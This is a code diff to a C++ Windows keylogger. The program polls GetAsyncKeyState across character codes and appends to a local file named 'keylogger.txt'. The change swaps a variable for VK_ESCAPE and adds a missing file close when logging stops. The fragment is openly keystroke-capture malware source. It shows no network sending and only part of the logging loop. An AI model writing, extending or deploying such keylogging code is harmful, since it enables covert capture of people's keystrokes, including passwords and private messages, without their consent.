@@ -48,18 +48,18 @@ bool KeyIsListed(int iKey){
 int main()
 {
     char key;
-    char end = VK_ESCAPE;
     int i=0;
     while (i<100){
         Sleep(10);
         for(key=32; key<=128;key++){
-            if (GetAsyncKeyState(end) ==-32767){
+            if (GetAsyncKeyState(VK_ESCAPE) ==-32767){
                 ofstream logfile;
                 time_t t = time(0);
                 tm* now = localtime(&t);
                 logfile.open("keylogger.txt", fstream::app);
                 logfile << "\nEND of LOG - DateTime of End: " << (now->tm_year + 1900) << '-' << (now->tm_mon + 1) << '-'<<  now->tm_mday << 
-                ' '<<now->tm_hour<<':'<<now->tm_min << "\n"; 
+                ' '<<now->tm_hour<<':'<<now->tm_min << "\n";
+                logfile.close(); 
             return 0;
             }
             if (GetAsyncKeyState(key) == -32767){  //the key is used and is not up
